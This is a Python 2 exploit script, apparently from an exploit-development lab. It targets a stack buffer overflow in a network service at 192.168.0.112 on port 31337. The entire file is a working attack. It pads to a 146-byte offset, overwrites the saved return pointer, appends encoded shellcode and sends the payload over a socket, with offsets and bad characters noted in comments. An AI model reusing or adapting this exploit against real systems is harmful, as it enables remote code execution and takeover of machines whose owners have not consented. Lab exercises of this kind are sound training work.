import sys
import socket

# The block address for epilogue is 0x8041794
# EIP offset 146
# EBP offset 142
# ESP length 874 OFFSET 150
# Only bad chars for shellcode are \x00 \x0A
IP = "192.168.0.112"
PORT = 31337

buffsize = 1024
offset_srp = 146
srp = '\xc3\x14\x04\x08'

shellcode =  ""
shellcode += "\xbd\x4a\x66\xd2\xd9\xd9\xce\xd9\x74\x24\xf4\x5a"
shellcode += "\x31\xc9\xb1\x52\x31\x6a\x12\x83\xea\xfc\x03\x20"
shellcode += "\x68\x30\x2c\x48\x9c\x36\xcf\xb0\x5d\x57\x59\x55"
shellcode += "\x6c\x57\x3d\x1e\xdf\x67\x35\x72\xec\x0c\x1b\x66"
shellcode += "\x67\x60\xb4\x89\xc0\xcf\xe2\xa4\xd1\x7c\xd6\xa7"
shellcode += "\x51\x7f\x0b\x07\x6b\xb0\x5e\x46\xac\xad\x93\x1a"
shellcode += "\x65\xb9\x06\x8a\x02\xf7\x9a\x21\x58\x19\x9b\xd6"
shellcode += "\x29\x18\x8a\x49\x21\x43\x0c\x68\xe6\xff\x05\x72"
shellcode += "\xeb\x3a\xdf\x09\xdf\xb1\xde\xdb\x11\x39\x4c\x22"
shellcode += "\x9e\xc8\x8c\x63\x19\x33\xfb\x9d\x59\xce\xfc\x5a"
shellcode += "\x23\x14\x88\x78\x83\xdf\x2a\xa4\x35\x33\xac\x2f"
shellcode += "\x39\xf8\xba\x77\x5e\xff\x6f\x0c\x5a\x74\x8e\xc2"
shellcode += "\xea\xce\xb5\xc6\xb7\x95\xd4\x5f\x12\x7b\xe8\xbf"
shellcode += "\xfd\x24\x4c\xb4\x10\x30\xfd\x97\x7c\xf5\xcc\x27"
shellcode += "\x7d\x91\x47\x54\x4f\x3e\xfc\xf2\xe3\xb7\xda\x05"
shellcode += "\x03\xe2\x9b\x99\xfa\x0d\xdc\xb0\x38\x59\x8c\xaa"
shellcode += "\xe9\xe2\x47\x2a\x15\x37\xc7\x7a\xb9\xe8\xa8\x2a"
shellcode += "\x79\x59\x41\x20\x76\x86\x71\x4b\x5c\xaf\x18\xb6"
shellcode += "\x37\x10\x74\xb8\xb0\xf8\x87\xb8\x3b\xc0\x0e\x5e"
shellcode += "\x29\x22\x47\xc9\xc6\xdb\xc2\x81\x77\x23\xd9\xec"
shellcode += "\xb8\xaf\xee\x11\x76\x58\x9a\x01\xef\xa8\xd1\x7b"
shellcode += "\xa6\xb7\xcf\x13\x24\x25\x94\xe3\x23\x56\x03\xb4"
shellcode += "\x64\xa8\x5a\x50\x99\x93\xf4\x46\x60\x45\x3e\xc2"
shellcode += "\xbf\xb6\xc1\xcb\x32\x82\xe5\xdb\x8a\x0b\xa2\x8f"
shellcode += "\x42\x5a\x7c\x79\x25\x34\xce\xd3\xff\xeb\x98\xb3"
shellcode += "\x86\xc7\x1a\xc5\x86\x0d\xed\x29\x36\xf8\xa8\x56"
shellcode += "\xf7\x6c\x3d\x2f\xe5\x0c\xc2\xfa\xad\x2d\x21\x2e"
shellcode += "\xd8\xc5\xfc\xbb\x61\x88\xfe\x16\xa5\xb5\x7c\x92"
shellcode += "\x56\x42\x9c\xd7\x53\x0e\x1a\x04\x2e\x1f\xcf\x2a"
shellcode += "\x9d\x20\xda"


buff = ""
buff += "A"*(offset_srp - len(buff)) #Padding
buff += srp # SRP Overwrite
buff += "\x83\xec\x10" # sub esp,10
buff += shellcode # ESP should end up pointing here
buff += "D"*(buffsize-len(buff)) # Trailing padding
buff += '\n'

print "[+] Connecting ..."

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,PORT))


s.send(buff)
print "Sent: {0}".format(buff)

data = s.recv(1024)
print ("We received from server: {0}".format(data))

print "[+] Done"
